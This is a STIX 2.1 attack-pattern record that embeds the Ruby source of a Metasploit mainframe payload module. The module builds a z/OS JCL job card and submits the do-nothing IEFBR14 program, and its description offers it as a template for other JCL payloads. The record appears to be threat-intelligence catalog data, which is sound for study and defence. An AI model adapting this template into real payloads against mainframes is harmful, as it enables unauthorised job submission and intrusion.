{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--88eb7ff3-5397-4f7d-8822-fa1ee4e5c601",
    "created": "2024-08-14T16:33:19.296062Z",
    "modified": "2024-08-14T16:33:19.296066Z",
    "name": "Generic JCL Test for Mainframe Exploits",
    "description": "Provide JCL which can be used to submit a job to JES2 on z/OS which will exit and return 0.  This can be used as a template for other JCL based payloads'",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/cmd/mainframe/generic_jcl.rb",
            "external_id": "generic_jcl.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n##\n# This is a prototype JCL command payload for z/OS - mainframe.\n#   It submits the IEFBR14 standard z/OS program, which does nothing\n#   but complete successfully and return code 0.\n#\n#   See http://www.ibm.com/support/knowledgecenter/SSLTBW_2.1.0/com.ibm.zos.v2r1.ieab500/hpropr.htm?lang=en\n#   for more information on IEFBR14\n##\n\n\nmodule MetasploitModule\n  CachedSize = 150\n  include Msf::Payload::Single\n  include Msf::Payload::Mainframe\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n                     'Name'          => 'Generic JCL Test for Mainframe Exploits',\n                     'Description'   => 'Provide JCL which can be used to submit\n                        a job to JES2 on z/OS which will exit and return 0.  This\n                        can be used as a template for other JCL based payloads',\n                     'Author'        => 'Bigendian Smalls',\n                     'License'       => MSF_LICENSE,\n                     'Platform'      => 'mainframe',\n                     'Arch'          => ARCH_CMD,\n                     'Handler'       => Msf::Handler::None,\n                     'Session'       => Msf::Sessions::MainframeShell,\n                     'PayloadType'   => 'cmd',\n                     'RequiredCmd'   => 'jcl',\n                     'Payload'       =>\n      {\n        'Offsets' => {},\n        'Payload' => ''\n      }))\n    register_options(\n      [\n        OptString.new('ACTNUM', [true, \"Accounting info for JCL JOB card\", \"MSFUSER-ACCTING-INFO\"]),\n        OptString.new('PGMNAME', [true, \"Programmer name for JCL JOB card\", \"programmer name\"]),\n        OptString.new('JCLASS', [true, \"Job Class for JCL JOB card\", \"A\"]),\n        OptString.new('NOTIFY', [false, \"Notify User for JCL JOB card\", \"\"]),\n        OptString.new('MSGCLASS', [true, \"Message Class for JCL JOB card\", \"Z\"]),\n        OptString.new('MSGLEVEL', [true, \"Message Level for JCL JOB card\", \"(0,0)\"])\n      ],\n      self.class\n    )\n    register_advanced_options(\n      [\n        OptBool.new('NTFYUSR', [true, \"Include NOTIFY Parm?\", false]),\n        OptString.new('JOBNAME', [true, \"Job name for JCL JOB card\", \"DUMMY\"])\n      ],\n      self.class\n    )\n  end\n\n  ##\n  # Construct Payload\n  ##\n  def generate(_opts = {})\n    super + command_string\n  end\n\n  ##\n  # Setup replacement vars from options if need be\n  ##\n  def command_string\n    jcl_jobcard +\n      \"//   EXEC PGM=IEFBR14\\n\"\n  end\nend\n",
    "x_mitre_platforms": [
        "mainframe'"
    ]
}